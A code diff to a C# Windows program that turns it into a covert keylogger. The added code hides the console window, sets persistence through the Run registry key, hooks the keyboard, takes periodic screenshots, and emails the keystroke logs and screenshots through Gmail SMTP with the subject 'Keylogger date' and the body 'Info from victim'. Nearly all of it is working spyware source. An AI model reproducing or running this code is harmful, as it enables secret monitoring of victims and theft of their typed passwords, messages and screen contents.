@@ -107,6 +107,128 @@ namespace LogFile
             UnhookWindowsHookEx(_hookID);
         }
         #endregion   
+
+        #region Timer
+        static int interval = 1;
+        static void StartTimmer()
+        {
+            Thread thread = new Thread(() =>
+            {
+                while (true)
+                {
+                    Thread.Sleep(1);
+
+                    if (interval % captureTime == 0)
+                        CaptureScreen();
+
+                    if (interval % mailTime == 0)
+                        SendMail();
+
+                    interval++;
+
+                    if (interval >= 1000000)
+                        interval = 0;
+                }
+            });
+            thread.IsBackground = true;
+            thread.Start();
+        }
+        #endregion
+
+        #region Windows
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        // hide window code
+        const int SW_HIDE = 0;
+
+        // show window code
+        const int SW_SHOW = 5;
+
+        static void HideWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_HIDE);
+        }
+
+        static void DisplayWindow()
+        {
+            IntPtr console = GetConsoleWindow();
+            ShowWindow(console, SW_SHOW);
+        }
+        #endregion
+
+        #region Registry that open with window
+        static void StartWithOS()
+        {
+            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
+            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+            string keyvalue = "1";
+            try
+            {
+                regkey.SetValue("Index", keyvalue);
+                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
+                regkey.Close();
+            }
+            catch (System.Exception ex)
+            {
+            }
+        }
+        #endregion
+
+        #region Mail
+        static int mailTime = 5000;
+        static void SendMail()
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+                mail.From = new MailAddress("email@gmail.com");
+                mail.To.Add("email@gmail.com");
+                mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+                mail.Body = "Info from victim\n";
+
+                string logFile = logName + DateTime.Now.ToLongDateString() + logExtendtion;
+
+                if (File.Exists(logFile))
+                {
+                    StreamReader sr = new StreamReader(logFile);
+
+                    mail.Body += sr.ReadToEnd();
+
+                    sr.Close();
+                }
+
+                string directoryImage = imagePath + DateTime.Now.ToLongDateString();
+                DirectoryInfo image = new DirectoryInfo(directoryImage);
+
+                foreach (FileInfo item in image.GetFiles("*.png"))
+                {
+                    if (File.Exists(directoryImage + "\\" + item.Name))
+                        mail.Attachments.Add(new Attachment(directoryImage + "\\" + item.Name));
+                }
+
+                SmtpServer.Port = 587;
+                SmtpServer.Credentials = new System.Net.NetworkCredential("email@gmail.com", "password");
+                SmtpServer.EnableSsl = true;
+
+                SmtpServer.Send(mail);
+                Console.WriteLine("Send mail!");
+
+                // phải làm cái này ở mail dùng để gửi phải bật lên
+                // https://www.google.com/settings/u/1/security/lesssecureapps
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+        #endregion
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
@@ -116,6 +238,11 @@ namespace LogFile
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
+            StartWithOS();
+            HideWindow();
+
+            StartTimmer();
+            HookKeyboard();
         }
     }
 }
